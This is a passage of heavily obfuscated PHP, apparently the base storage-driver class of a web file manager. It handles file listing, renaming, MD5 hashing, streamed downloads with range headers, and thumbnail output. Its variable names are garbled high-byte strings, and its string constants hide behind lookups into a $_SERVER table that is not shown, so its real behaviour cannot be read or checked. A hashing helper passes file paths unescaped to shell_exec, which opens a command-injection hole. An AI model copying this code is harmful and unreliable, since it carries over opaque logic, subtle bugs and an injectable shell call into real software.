!1; } public function setModifyTime($•·¥Î•, $â¸†´¶… = '') { } public function renameObject($± Şß°, $”À°Å…) { $¥à…üÒ“ = $”À°Å…; $± Şß° = $this->getPathOuter($± Şß°); $”À°Å… = $this->pathFather($± Şß°) . $”À°Å…; $÷˜·º÷” = IO::copy($± Şß°, $this->pathFather($± Şß°), REPEAT_RENAME_FOLDER, $¥à…üÒ“); if ($÷˜·º÷”) { IO::remove($± Şß°); } return $÷˜·º÷” ? $”À°Å… : !1; } public function tempFile($èø¢Ñ = '', $í›üôƒÇ = '') { if (!$èø¢Ñ) { $èø¢Ñ = rand_string(15); } $€ò³˜à¹ = TEMP_FILES . rand_string(15) . $_SERVER[Ñ¯©ç][8]; @mkdir($€ò³˜à¹, DEFAULT_PERRMISSIONS, !0); $Åô•îö = $€ò³˜à¹ . $èø¢Ñ; @touch($Åô•îö); if ($í›üôƒÇ) { file_put_contents($Åô•îö, $í›üôƒÇ); } return $Åô•îö; } public function tempFileRemve($Û àşØ) { @unlink($Û àşØ); @rmdir($this->pathFather($Û àşØ)); } public function mkfile($ÊüÛ¡£, $õ÷ÛÏë» = '', $ ñŠ‰€§ = REPEAT_RENAME) { } public function mkdir($ÒáŞ·±Å, $¬ƒá•¯ƒ = REPEAT_SKIP) { } public function delFile($×ÌÇŒ•) { } public function delFolder($§é­††•) { } public function copyFile($âù¾Ü¾, $´›ó×¢Ô) { } public function moveFile($ÇÃæãƒ, $àÑöæÛì) { } public function remove($‘œ“›¿¤) { if ($this->isFile($‘œ“›¿¤)) { return $this->delFile($‘œ“›¿¤); } return $this->delFolder($‘œ“›¿¤); } public function rename($…£®¹èá, $Õ·¬ûŸ) { } public function exist($Ø±Ñ¯¬Ş) { } public function findByHash($ƒÕÍé€à = '', $‘­®‘³µ = '') { return !1; } public function isFile($ó©â±øÄ) { } public function isFolder($³·öÛì) { } public function size($İÄĞÜÂÆ) { } public function info($–ìâ“Ş’) { } public function infoSimple($ÅÄßæ¼) { return $this->info($ÅÄßæ¼); } public function infoAuth($Ã±ğ¡¡“) { return $this->info($Ã±ğ¡¡“); } public function infoFull($İ¬şÖĞ) { return $this->info($İ¬şÖĞ); } public function infoFullSimple($½é‚ˆ³ã) { return $this->info($½é‚ˆ³ã); } public function infoWithChildren($õøş¥É²) { $ÅË‡Å” =& $_SERVER[Ñ¯©ç]; static $üĞÆÍ€ = array(); if (isset($üĞÆÍ€[$õøş¥É²])) { return $üĞÆÍ€[$õøş¥É²]; } $”ô®»î’ = $this->info($õøş¥É²); if ($”ô®»î’ && $”ô®»î’[$ÅË‡Å”[33]] == $ÅË‡Å”[88]) { $·ÜĞåĞÛ = array($ÅË‡Å”[89] => 0, $ÅË‡Å”[90] => 0, $ÅË‡Å”[91] => 0); $this->infoChildren($õøş¥É², $·ÜĞåĞÛ); $”ô®»î’[$ÅË‡Å”[89]] = $·ÜĞåĞÛ[$ÅË‡Å”[89]]; $”ô®»î’[$ÅË‡Å”[92]] = array($ÅË‡Å”[93] => $·ÜĞåĞÛ[$ÅË‡Å”[90]], $ÅË‡Å”[94] => $·ÜĞåĞÛ[$ÅË‡Å”[91]]); $üĞÆÍ€[$õøş¥É²] = $”ô®»î’; } return $”ô®»î’; } public function listPath($ùĞúä¨™, $îÀ…“„æ = false) { } public function has($²´ƒÓÎğ, $é¸›¶™ş = false, $“¹Åç¯ = false) { } public function canRead($Ö²‘»ßû) { } public function canWrite($¾™¶ûê) { } public function getContent($–Õ§ÓÓÕ) { } public function setContent($•½ıìá×, $­ËœØáÄ = '') { } protected function infoChildren($İ³·ªÆ, &$•ÊãÅ¿¦) { $»Æ×Š£Í =& $_SERVER[Ñ¯©ç]; check_abort_echo(); $¶Ğóì•š = $this->listPath($İ³·ªÆ, !0); $¶Ğóì•š = array_merge($¶Ğóì•š[$»Æ×Š£Í[95]], $¶Ğóì•š[$»Æ×Š£Í[96]]); foreach ($¶Ğóì•š as $ñßÓ™Æ¦) { if ($ñßÓ™Æ¦[$»Æ×Š£Í[33]] == $»Æ×Š£Í[88]) { $•ÊãÅ¿¦[$»Æ×Š£Í[91]]++; $ØÑÁ³¯ = $this->getPathInner($ñßÓ™Æ¦[$»Æ×Š£Í[97]]); $this->infoChildren($ØÑÁ³¯, $•ÊãÅ¿¦); } else { $•ÊãÅ¿¦[$»Æ×Š£Í[90]]++; $•ÊãÅ¿¦[$»Æ×Š£Í[89]] += $ñßÓ™Æ¦[$»Æ×Š£Í[89]]; } } } public function fileSubstr($ô±à£ùí, $‘ƒ¦¯‰—, $Ä¿¢ôî) { } public function listAll($ìŸÕå¡) { } public function listAllMake($Ì‰ , &$âŠîÛ«Æ) { $­ëÌ¥ôØ =& $_SERVER[Ñ¯©ç]; check_abort_echo(); $Ò¿÷‰‡Ø = $this->listPath($Ì‰ , !0); if (!$Ò¿÷‰‡Ø) { return; } $ó¢Öœ†¼ = array_merge($Ò¿÷‰‡Ø[$­ëÌ¥ôØ[95]], $Ò¿÷‰‡Ø[$­ëÌ¥ôØ[96]]); foreach ($ó¢Öœ†¼ as $îé‡İ›†) { $Ø…àåÕá = $îé‡İ›†[$­ëÌ¥ôØ[33]] == $­ëÌ¥ôØ[88]; $ï…Ï¼òØ = array($­ëÌ¥ôØ[97] => $îé‡İ›†[$­ëÌ¥ôØ[97]], $­ëÌ¥ôØ[88] => $Ø…àåÕá); if (isset($îé‡İ›†[$­ëÌ¥ôØ[89]])) { $ï…Ï¼òØ[$­ëÌ¥ôØ[89]] = $îé‡İ›†[$­ëÌ¥ôØ[89]]; } if (isset($îé‡İ›†[$­ëÌ¥ôØ[98]])) { $ï…Ï¼òØ[$­ëÌ¥ôØ[98]] = $îé‡İ›†[$­ëÌ¥ôØ[98]]; } if (!$Ø…àåÕá) { $âŠîÛ«Æ[] = $ï…Ï¼òØ; continue; } $âŠîÛ«Æ[] = $ï…Ï¼òØ; $Ç›˜’áÖ = $îé‡İ›†[$­ëÌ¥ôØ[97]]; $€’Î‰¡‹ = $this->pathDriver; if (substr($îé‡İ›†[$­ëÌ¥ôØ[97]], 0, strlen($€’Î‰¡‹)) == $€’Î‰¡‹) { $Ç›˜’áÖ = substr($Ç›˜’áÖ, strlen($€’Î‰¡‹)); } $this->listAllMake($Ç›˜’áÖ, $âŠîÛ«Æ); } } public function listAllSimple($âËÍîıŠ, $€ÛÃÎï… = false) { $Ú“Æç¢‹ = $this->listAll($âËÍîıŠ); return $this->listAllSimpleMake($Ú“Æç¢‹, $this->getPathOuter($âËÍîıŠ), $€ÛÃÎï…); } public function listAllSimpleMake($ö¯€»¾, $ÙŸçÌ‡Ò, $è‹Ê»‰Ø) { $Æş¶’Ì =& $_SERVER[Ñ¯©ç]; $Œ¡à´È = array(); $ÙŸçÌ‡Ò = rtrim(get_path_father($ÙŸçÌ‡Ò), $Æş¶’Ì[8]) . $Æş¶’Ì[8]; foreach ($ö¯€»¾ as $šâÚè¼) { $¡±Ã‹¤Ï = array($Æş¶’Ì[97] => $šâÚè¼[$Æş¶’Ì[97]], $Æş¶’Ì[99] => $šâÚè¼[$Æş¶’Ì[97]], $Æş¶’Ì[88] => $šâÚè¼[$Æş¶’Ì[88]]); if (isset($šâÚè¼[$Æş¶’Ì[89]]) && !$šâÚè¼[$Æş¶’Ì[88]]) { $¡±Ã‹¤Ï[$Æş¶’Ì[89]] = $šâÚè¼[$Æş¶’Ì[89]]; } if (isset($šâÚè¼[$Æş¶’Ì[98]])) { $¡±Ã‹¤Ï[$Æş¶’Ì[98]] = $šâÚè¼[$Æş¶’Ì[98]]; } if (is_array($šâÚè¼[$Æş¶’Ì[100]])) { $¡±Ã‹¤Ï[$Æş¶’Ì[99]] = $šâÚè¼[$Æş¶’Ì[100]][$Æş¶’Ì[97]]; $¡±Ã‹¤Ï[$Æş¶’Ì[89]] = $šâÚè¼[$Æş¶’Ì[100]][$Æş¶’Ì[89]]; $¡±Ã‹¤Ï[$Æş¶’Ì[98]] = $šâÚè¼[$Æş¶’Ì[100]][$Æş¶’Ì[98]]; } else { if (substr($šâÚè¼[$Æş¶’Ì[97]], 0, strlen($ÙŸçÌ‡Ò)) == $ÙŸçÌ‡Ò) { $¡±Ã‹¤Ï[$Æş¶’Ì[97]] = substr($šâÚè¼[$Æş¶’Ì[97]], strlen($ÙŸçÌ‡Ò)); } } $ïµšÈ¼ = $šâÚè¼[$Æş¶’Ì[88]] ? $Æş¶’Ì[8] : $Æş¶’Ì[12]; $¡±Ã‹¤Ï[$Æş¶’Ì[99]] = rtrim($¡±Ã‹¤Ï[$Æş¶’Ì[99]], $Æş¶’Ì[8]) . $ïµšÈ¼; $¡±Ã‹¤Ï[$Æş¶’Ì[97]] = $Æş¶’Ì[8] . trim($¡±Ã‹¤Ï[$Æş¶’Ì[97]], $Æş¶’Ì[8]) . $ïµšÈ¼; if (!$è‹Ê»‰Ø) { $ÍÆ€Ù’ = explode($Æş¶’Ì[8], trim($¡±Ã‹¤Ï[$Æş¶’Ì[97]], $Æş¶’Ì[8])); $¡±Ã‹¤Ï[$Æş¶’Ì[97]] = $Æş¶’Ì[8] . implode($Æş¶’Ì[8], array_slice($ÍÆ€Ù’, 1)) . $ïµšÈ¼; } $Œ¡à´È[] = $¡±Ã‹¤Ï; } return array_sort_by($Œ¡à´È, $Æş¶’Ì[97]); } public function upload($Ô‚ŸâÏ­, $ñ²•Ş‘±, $¯Ôùü‚ù = false, $˜ì¥¿„² = REPEAT_REPLACE) { } public function uploadFileByID($ÆÖÑ²Ñç, $ê…ô¸Í, $ÉˆÛÚß) { } public function uploadFileByPath($Ú¨ªÔö£, $·íˆ×–, $õî¦òé = array()) { } public function isUploadServer() { $ƒ±Ï“Óå =& $_SERVER[Ñ¯©ç]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ƒ±Ï“Óå[101]) { return !0; } return $GLOBALS[$ƒ±Ï“Óå[6]][$ƒ±Ï“Óå[102]][$ƒ±Ï“Óå[103]]; } public function isFileOutServer() { $ŞŠ’¶¨¬ =& $_SERVER[Ñ¯©ç]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ŞŠ’¶¨¬[101]) { return !0; } return $GLOBALS[$ŞŠ’¶¨¬[6]][$ŞŠ’¶¨¬[102]][$ŞŠ’¶¨¬[104]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($ğØ¹Ì§Ï) { $½ÃÔã–µ =& $_SERVER[Ñ¯©ç]; if (!$this->isCdnHost()) { return $ğØ¹Ì§Ï; } return str_replace(trim(get_url_root($ğØ¹Ì§Ï), $½ÃÔã–µ[8]), trim($this->cdnHost, $½ÃÔã–µ[8]), $ğØ¹Ì§Ï); } public function uploadLink($¼™Ö¿å³, $ ·‹á’Ã = 0) { $šÍ¦¹ŞØ =& $_SERVER[Ñ¯©ç]; if ($this->isUploadServer()) { return; } $†Ñˆ²Ì = $this->getType(); if (!in_array($†Ñˆ²Ì, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ó«÷¢óê = 1024 * 1024 * 10; $âó÷İ¤á = $ ·‹á’Ã <= $ó«÷¢óê ? $šÍ¦¹ŞØ[105] : $šÍ¦¹ŞØ[106]; $‘Ú•ó„… = (!$ ·‹á’Ã ? 1 : ceil($ ·‹á’Ã / pow(1024, 3))) * 3600 * 4; $â–¬Ø—ì = $this->{$âó÷İ¤á}($¼™Ö¿å³, $‘Ú•ó„…); if ($â–¬Ø—ì) { $â–¬Ø—ì[$šÍ¦¹ŞØ[107]] = $¼™Ö¿å³; $â–¬Ø—ì[$šÍ¦¹ŞØ[108]] = $†Ñˆ²Ì; } return $â–¬Ø—ì; } public function uploadFormData($¡•õÁ, $šüıãºÖ = 3600) { } public function multiUploadFormData($™¤×ÂçÇ, $„ïË¹á” = 3600) { } public function download($ÕŒƒ×…—, $¦ş‰ˆ³) { } public function ext($Ÿ’¦§˜Á) { $¦ßˆªª =& $_SERVER[Ñ¯©ç]; if (strpos($Ÿ’¦§˜Á, $¦ßˆªª[8]) === -1) { $‰æëÌ€è = $Ÿ’¦§˜Á; } else { $‰æëÌ€è = $this->pathThis($Ÿ’¦§˜Á); } $©³çõ¬ñ = $¦ßˆªª[12]; if (strstr($‰æëÌ€è, $¦ßˆªª[10])) { $©³çõ¬ñ = substr($‰æëÌ€è, strrpos($‰æëÌ€è, $¦ßˆªª[10]) + 1); $©³çõ¬ñ = strtolower($©³çõ¬ñ); } if (strlen($©³çõ¬ñ) > 3 && preg_match($¦ßˆªª[109], $©³çõ¬ñ, $íşæÛÏå)) { $©³çõ¬ñ = $¦ßˆªª[12]; } return $©³çõ¬ñ; } public function pathThis($Ò®Àû“ã) { $Ë÷‘Š€Ã =& $_SERVER[Ñ¯©ç]; $Ò®Àû“ã = str_replace($Ë÷‘Š€Ã[110], $Ë÷‘Š€Ã[8], rtrim($Ò®Àû“ã, $Ë÷‘Š€Ã[8])); $¯ÂºÛ¡ = strrpos($Ò®Àû“ã, $Ë÷‘Š€Ã[8]); if ($¯ÂºÛ¡ === !1) { return $Ò®Àû“ã; } return substr($Ò®Àû“ã, $¯ÂºÛ¡ + 1); } public function pathFather($Õõœ²³§) { $êú±€åÓ =& $_SERVER[Ñ¯©ç]; $Õõœ²³§ = str_replace($êú±€åÓ[110], $êú±€åÓ[8], rtrim($Õõœ²³§, $êú±€åÓ[8])); $‹Ê½×¹Ø = strrpos($Õõœ²³§, $êú±€åÓ[8]); if ($‹Ê½×¹Ø === !1) { return $êú±€åÓ[12]; } return substr($Õõœ²³§, 0, $‹Ê½×¹Ø + 1); } public function hashSimple($Üõè¿öˆ) { $¸™ò¹¶ =& $_SERVER[Ñ¯©ç]; if (!$Üõè¿öˆ) { return md5($¸™ò¹¶[12]); } $ó§¡Šøî = $this->size($Üõè¿öˆ); $ÒõÒûš÷ = 200; $Àöíòå— = 50; if ($ó§¡Šøî <= $ÒõÒûš÷ * $Àöíòå—) { return $this->hashMd5($Üõè¿öˆ) . $ó§¡Šøî; } $üìˆüÚ¦ = intval($ó§¡Šøî / $Àöíòå—); $ËÆ¡‰“Ÿ = $¸™ò¹¶[12]; for ($ÕğÑÔ¦ = 0; $ÕğÑÔ¦ < $Àöíòå—; $ÕğÑÔ¦++) { $ËÆ¡‰“Ÿ .= $this->fileSubstr($Üõè¿öˆ, $üìˆüÚ¦ * $ÕğÑÔ¦, $ÒõÒûš÷); } $ËÆ¡‰“Ÿ .= $this->fileSubstr($Üõè¿öˆ, $ó§¡Šøî - $ÒõÒûš÷, $ÒõÒûš÷); return md5($ËÆ¡‰“Ÿ) . $ó§¡Šøî; } public static $md5Cache = array(); public function hashMd5($Üí¯æß) { if (!$Üí¯æß) { return md5($_SERVER[Ñ¯©ç][12]); } $Üí¯æß = $this->iconvSystem($Üí¯æß); if (isset(self::$md5Cache[$Üí¯æß])) { return self::$md5Cache[$Üí¯æß]; } self::$md5Cache[$Üí¯æß] = $this->hashMd5Shell($Üí¯æß); if (!self::$md5Cache[$Üí¯æß]) { self::$md5Cache[$Üí¯æß] = @md5_file($Üí¯æß); } return self::$md5Cache[$Üí¯æß]; } private function hashMd5Shell($÷¤ÈÕĞ§) { $’­«ıƒ½ =& $_SERVER[Ñ¯©ç]; if (!$÷¤ÈÕĞ§) { return md5($’­«ıƒ½[12]); } if (!function_exists($’­«ıƒ½[111])) { return !1; } $×†¡÷‘í = array($’­«ıƒ½[112], $’­«ıƒ½[113]); $ëˆîà¤« = Cache::get($’­«ıƒ½[114]); if (!$ëˆîà¤«) { $— ”¡éœ = BASIC_PATH . $’­«ıƒ½[115]; $Şæ§¨¢ñ = md5_file($— ”¡éœ); $ëˆîà¤« = $’­«ıƒ½[116]; foreach ($×†¡÷‘í as $âŠÇ–ß) { $Ø•áÀÔà = shell_exec($âŠÇ–ß . "\40\x22{$— ”¡éœ}\x22"); if ($Ø•áÀÔà && substr(trim($Ø•áÀÔà), 0, 32) == $Şæ§¨¢ñ) { $ëˆîà¤« = $âŠÇ–ß; break; } } Cache::set($’­«ıƒ½[114], $ëˆîà¤«, 3600); } if ($ëˆîà¤« == $’­«ıƒ½[116]) { return !1; } $Ø•áÀÔà = shell_exec($ëˆîà¤« . "\x20\x22{$÷¤ÈÕĞ§}\x22"); $Ø•áÀÔà = str_replace($’­«ıƒ½[117], $’­«ıƒ½[12], $Ø•áÀÔà); return substr($Ø•áÀÔà, 0, 32); } public function link($µÕÑ¦ÚÂ) { return $µÕÑ¦ÚÂ; } public function fileOut($ò—êÊ£–, $‚† ×¯ò = false, $™ÃìÁ·¨ = false, $®ºıÌÛ = '') { $ÇĞŒôñá =& $_SERVER[Ñ¯©ç]; $this->cacheMethod(null, null); if (!$ò—êÊ£– || !$this->exist($ò—êÊ£–)) { show_json(LNG($ÇĞŒôñá[118]), !1, $™ÃìÁ·¨); } $¾†öËÁ = $this->getType() == $ÇĞŒôñá[119]; $óÃ§„Ÿç = $GLOBALS[$ÇĞŒôñá[6]][$ÇĞŒôñá[102]][$ÇĞŒôñá[120]][$ÇĞŒôñá[121]]; $©’ŠØé„ = (double) $GLOBALS[$ÇĞŒôñá[6]][$ÇĞŒôñá[102]][$ÇĞŒôñá[120]][$ÇĞŒôñá[122]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ÃÏş»ËÄ = $this->infoFull($ò—êÊ£–); $ƒ¤±‚¥‚ = $ÃÏş»ËÄ[$ÇĞŒôñá[89]]; $øƒˆğÊ = gmdate($ÇĞŒôñá[123], $ÃÏş»ËÄ[$ÇĞŒôñá[98]]); $Î¶ƒìô = $™ÃìÁ·¨ ? $™ÃìÁ·¨ : $this->iconvApp($ÃÏş»ËÄ[$ÇĞŒôñá[32]]); $—úéôÆ = 0; $¸Æáé÷Û = $ƒ¤±‚¥‚ - 1; $Ú´¼îŞ = $this->ext($Î¶ƒìô); if (in_array($Ú´¼îŞ, array($ÇĞŒôñá[124], $ÇĞŒôñá[125], $ÇĞŒôñá[126], $ÇĞŒôñá[127]))) { $Ú´¼îŞ = $ÇĞŒôñá[128]; } if (in_array($Ú´¼îŞ, array($ÇĞŒôñá[129]))) { $Ú´¼îŞ = $ÇĞŒôñá[130]; } if (!$®ºıÌÛ) { $®ºıÌÛ = md5($øƒˆğÊ . $ƒ¤±‚¥‚); } $®ºıÌÛ = $ÇĞŒôñá[131] . $®ºıÌÛ . $ÇĞŒôñá[131]; $üÕóÓû = get_file_mime($Ú´¼îŞ); $£Å•ı± = !0; $£Å•ı± = isset($_GET[$ÇĞŒôñá[132]]) ? !1 : !0; if ($‚† ×¯ò === !1 && !mime_support($üÕóÓû)) { $üÕóÓû = $ÇĞŒôñá[133]; } header($ÇĞŒôñá[134]); header($ÇĞŒôñá[135] . $üÕóÓû); $ÉÌŠøîÖ = rawurlencode($Î¶ƒìô); $ÉÌŠøîÖ = $ÇĞŒôñá[131] . $ÉÌŠøîÖ . $ÇĞŒôñá[136] . $ÉÌŠøîÖ; if ($‚† ×¯ò) { header($ÇĞŒôñá[137]); header($ÇĞŒôñá[138] . $ÉÌŠøîÖ); } else { if ($£Å•ı±) { header($ÇĞŒôñá[139] . $ÉÌŠøîÖ); } } header($ÇĞŒôñá[140] . gmdate($ÇĞŒôñá[123], time() + 3600 * 24 * 30) . $ÇĞŒôñá[141]); header($ÇĞŒôñá[142]); header($ÇĞŒôñá[143]); header($ÇĞŒôñá[144]); if (isset($_SERVER[$ÇĞŒôñá[145]]) && strtotime($_SERVER[$ÇĞŒôñá[145]]) == $ÃÏş»ËÄ[$ÇĞŒôñá[98]]) { header($ÇĞŒôñá[146], !0, 304); die; } if (isset($_SERVER[$ÇĞŒôñá[147]]) && $_SERVER[$ÇĞŒôñá[147]] == $®ºıÌÛ) { header($ÇĞŒôñá[148] . $®ºıÌÛ, !0, 304); die; } header($ÇĞŒôñá[148] . $®ºıÌÛ); header($ÇĞŒôñá[149] . $øƒˆğÊ . $ÇĞŒôñá[141]); header($ÇĞŒôñá[150] . $Î¶ƒìô); header($ÇĞŒôñá[151]); header($ÇĞŒôñá[152] . $ƒ¤±‚¥‚); header($ÇĞŒôñá[153]); Hook::trigger($ÇĞŒôñá[154], $ò—êÊ£–, $ƒ¤±‚¥‚, $Î¶ƒìô, $Ú´¼îŞ); if (!$‚† ×¯ò && $Ú´¼îŞ == $ÇĞŒôñá[155]) { if ($ƒ¤±‚¥‚ > 1024 * 1024 * 5) { die; } $›¯º†€¶ = $this->getContent($ò—êÊ£–); $›¯º†€¶ = Html::clearSVG($›¯º†€¶); header($ÇĞŒôñá[156] . strlen($›¯º†€¶)); echo $›¯º†€¶; die; } $¾§®¿¥ = strtolower($_SERVER[$ÇĞŒôñá[157]]); if ($¾†öËÁ && $¾§®¿¥ && $óÃ§„Ÿç) { if (strstr($¾§®¿¥, $ÇĞŒôñá[158])) { header($ÇĞŒôñá[159] . $ò—êÊ£–); } else { if (strstr($¾§®¿¥, $ÇĞŒôñá[160])) { header($ÇĞŒôñá[161] . $ò—êÊ£–); } else { if (strstr($¾§®¿¥, $ÇĞŒôñá[162])) { header($ÇĞŒôñá[163] . $ò—êÊ£–); } } } if ($©’ŠØé„) { header($ÇĞŒôñá[164] . $©’ŠØé„); } return; } if (isset($_SERVER[$ÇĞŒôñá[165]])) { if (preg_match($ÇĞŒôñá[166], $_SERVER[$ÇĞŒôñá[165]], $óøƒÙ)) { $—úéôÆ = intval($óøƒÙ[1]); $—úéôÆ = $—úéôÆ <= 0 ? 0 : ($—úéôÆ >= $¸Æáé÷Û ? $¸Æáé÷Û : $—úéôÆ); if (!empty($óøƒÙ[2])) { $¸»€“Öè = intval($óøƒÙ[2]); $¸Æáé÷Û = $¸»€“Öè < $—úéôÆ ? $—úéôÆ : ($¸»€“Öè >= $¸Æáé÷Û ? $¸Æáé÷Û : $¸»€“Öè); } } header($ÇĞŒôñá[167]); header("\x43\x6f\x6e\164\145\x6e\164\55\122\141\156\x67\145\x3a\40\142\x79\x74\x65\163\40{$—úéôÆ}\55{$¸Æáé÷Û}\x2f" . $ƒ¤±‚¥‚); } else { header($ÇĞŒôñá[168]); } header($ÇĞŒôñá[169]); $¨ÅÒ¡˜¢ = !0; if ($_SERVER[$ÇĞŒôñá[170]] == $ÇĞŒôñá[171] && $ƒ¤±‚¥‚ > 1204 * 1024 * 1024 * 2) { $¨ÅÒ¡˜¢ = !1; } if ($¨ÅÒ¡˜¢) { header($ÇĞŒôñá[172] . ($¸Æáé÷Û - $—úéôÆ + 1)); } if ($_SERVER[$ÇĞŒôñá[173]] == $ÇĞŒôñá[174]) { return; } $¤¯‡î¾Ù = 1024 * 100; $ê¿Æëœë = 0; if ($©’ŠØé„) { $ê¿Æëœë = intval(1000 * 1000 * ($¤¯‡î¾Ù / $©’ŠØé„)); } while ($—úéôÆ <= $¸Æáé÷Û) { $ì¶Ôöú = timeFloat(); check_abort(); $×Ä•‚Ÿô = $¸Æáé÷Û - $—úéôÆ + 1; if ($×Ä•‚Ÿô <= $¤¯‡î¾Ù) { $¤¯‡î¾Ù = $×Ä•‚Ÿô; } echo $this->fileSubstr($ò—êÊ£–, $—úéôÆ, $¤¯‡î¾Ù); $—úéôÆ += $¤¯‡î¾Ù; if ($¤¯‡î¾Ù == $×Ä•‚Ÿô) { $—úéôÆ = $¸Æáé÷Û + 1; } if ($ê¿Æëœë) { $ˆìõ¶—Ø = intval(1000 * 1000 * (timeFloat() - $ì¶Ôöú)); $ğó£“ûÌ = $ê¿Æëœë - $ˆìõ¶—Ø; if ($ğó£“ûÌ > 5) { usleep($ğó£“ûÌ); } } } } public function fileOutServer($Áè´Í•à, $Ô·ğˆ” = false, $×‰ÏŠ¯ = false, $çá¤›ö˜ = '') { $this->fileOut($Áè´Í•à, $Ô·ğˆ”, $×‰ÏŠ¯, $çá¤›ö˜); } public function fileOutLink($ôÙ÷ˆ…É) { header($_SERVER[Ñ¯©ç][175] . $ôÙ÷ˆ…É); die; } public function cacheMethod($ÀÊ§àİı, $ş¶šª„›, $ÛèÓ–ÂÅ = null) { $åßìğùû =& $_SERVER[Ñ¯©ç]; static $«‡¹Õ¨ = array(); $ìÍ‰ö¦ = $ş¶šª„› ? ltrim($this->getPathOuter($ş¶šª„›), $åßìğùû[8]) : $åßìğùû[12]; $†œ¥‘¯É = $åßìğùû[176] . $ÀÊ§àİı . $åßìğùû[177] . rtrim($ìÍ‰ö¦, $åßìğùû[8]); if (is_null($ÀÊ§àİı)) { $«‡¹Õ¨ = array(); return; } if (is_null($ş¶šª„›)) { foreach ($«‡¹Õ¨ as $†œ¥‘¯É => $ÄİŞü‡Å) { if (!strstr($†œ¥‘¯É, $åßìğùû[176] . $ÀÊ§àİı . $åßìğùû[178])) { continue; } unset($«‡¹Õ¨[$†œ¥‘¯É]); } return; } if (!is_null($ÛèÓ–ÂÅ)) { $«‡¹Õ¨[$†œ¥‘¯É] = $ÛèÓ–ÂÅ; return; } $ƒŞ”¬¦¨ = isset($«‡¹Õ¨[$†œ¥‘¯É]) ? $«‡¹Õ¨[$†œ¥‘¯É] : null; if (!is_null($ƒŞ”¬¦¨)) { return $ƒŞ”¬¦¨; } $ƒŞ”¬¦¨ = $this->{$ÀÊ§àİı}($ş¶šª„›); $«‡¹Õ¨[$†œ¥‘¯É] = $ƒŞ”¬¦¨; return $ƒŞ”¬¦¨; } public function cacheMethodInfoSet($ÈôîÑª¢, $µê‹º¡¹, $¢ß‹¶«ì = false) { $—šÙ¼ö„ =& $_SERVER[Ñ¯©ç]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($—šÙ¼ö„[179], $ÈôîÑª¢, $µê‹º¡¹); $this->cacheMethod($—šÙ¼ö„[180], $ÈôîÑª¢, $µê‹º¡¹ ? !1 : !0); if (is_array($¢ß‹¶«ì)) { $this->cacheMethod($—šÙ¼ö„[181], $ÈôîÑª¢, $¢ß‹¶«ì); } } public function fileOutImage($÷ŸÅñö, $Éåô‚Àµ = 250) { $ØÖİ‚Ê =& $_SERVER[Ñ¯©ç]; set_timeout(); if (substr($÷ŸÅñö, 0, 4) == $ØÖİ‚Ê[162]) { $this->fileOutLink($÷ŸÅñö); } $¼˜”£ÓÂ = $this->info($÷ŸÅñö); $™ªºîŞù = !1; $¹µÁ¥¾ = isset($GLOBALS[$ØÖİ‚Ê[182]]) ? $GLOBALS[$ØÖİ‚Ê[182]] : array(); if ($¹µÁ¥¾ && $¹µÁ¥¾[$ØÖİ‚Ê[183]] == $¼˜”£ÓÂ[$ØÖİ‚Ê[97]]) { $¼˜”£ÓÂ = $¹µÁ¥¾; $ÀºŒ¼ã = $¼˜”£ÓÂ[$ØÖİ‚Ê[184]]; if ($ÀºŒ¼ã && isset($ÀºŒ¼ã[$ØÖİ‚Ê[185]])) { if ($ÀºŒ¼ã[$ØÖİ‚Ê[185]] <= $Éåô‚Àµ && $ÀºŒ¼ã[$ØÖİ‚Ê[186]] <= $Éåô‚Àµ) { $™ªºîŞù = !0; } } } if ($¼˜”£ÓÂ[$ØÖİ‚Ê[89]] <= 1024 * 50 || $™ªºîŞù || !function_exists($ØÖİ‚Ê[187]) || $¼˜”£ÓÂ[$ØÖİ‚Ê[188]] == $ØÖİ‚Ê[189]) { return $this->fileOut($÷ŸÅñö, !1, $¼˜”£ÓÂ[$ØÖİ‚Ê[32]]); } $¹Ë¹†” = kodIO::hashPath($¼˜”£ÓÂ); $éË­„¯‹ = "\x63\x6f\x76\145\162\137{$¹Ë¹†”}\137{$Éåô‚Àµ}\56\160\x6e\147"; $„Ñ¹‚Æ = IO_PATH_SYSTEM_TEMP . $ØÖİ‚Ê[190]; $›¥óŠÛ† = IO::infoFullSimple($„Ñ¹‚Æ); $¬íÌ ŠÊ = $›¥óŠÛ† && is_array($›¥óŠÛ†) ? $›¥óŠÛ†[$ØÖİ‚Ê[97]] : $ØÖİ‚Ê[12]; if (!$¬íÌ ŠÊ) { $¬íÌ ŠÊ = IO::mkdir($„Ñ¹‚Æ); } if ($¼˜”£ÓÂ[$ØÖİ‚Ê[191]] == $ØÖİ‚Ê[192] && isset($¼˜”£ÓÂ[$ØÖİ‚Ê[193]]) && $¼˜”£ÓÂ[$ØÖİ‚Ê[193]] == kodIO::sourceID($¬íÌ ŠÊ)) { $´×¤®Ç¡ = $¼˜”£ÓÂ[$ØÖİ‚Ê[194]]; if ($Éåô‚Àµ <= 500) { $’üé’Ñ– = preg_replace($ØÖİ‚Ê[195], $ØÖİ‚Ê[196], $¼˜”£ÓÂ[$ØÖİ‚Ê[32]]); $´×¤®Ç¡ = IO::fileNameExist($¬íÌ ŠÊ, $’üé’Ñ–); } return IO::fileOut(KodIO::make($´×¤®Ç¡), !1, $¼˜”£ÓÂ[$ØÖİ‚Ê[32]]); } $ÂÀª½ğ = IO::fileNameExist($¬íÌ ŠÊ, $éË­„¯‹); if ($ÂÀª½ğ) { return IO::fileOut(KodIO::make($ÂÀª½ğ), !1, $¼˜”£ÓÂ[$ØÖİ‚Ê[32]]); } if ($Éåô‚Àµ > 1000) { $this->makeImageCover($¬íÌ ŠÊ, $÷ŸÅñö, $éË­„¯‹, $Éåô‚Àµ); $this->makeImageCover($¬íÌ ŠÊ, $÷ŸÅñö, "\x63\x6f\x76\x65\x72\137{$¹Ë¹†”}\x5f\x32\65\x30\56\x70\x6e\x67", 250); $ÂÀª½ğ = IO::fileNameExist($¬íÌ ŠÊ, $éË­„¯‹); if ($ÂÀª½ğ) { return IO::fileOut(KodIO::make($ÂÀª½ğ), !1, $¼˜”£ÓÂ[$ØÖİ‚Ê[32]]); } die; } $ôÖ¶ÑÍâ = Cache::get($éË­„¯‹); if ($ôÖ¶ÑÍâ == $ØÖİ‚Ê[197] || $ôÖ¶ÑÍâ 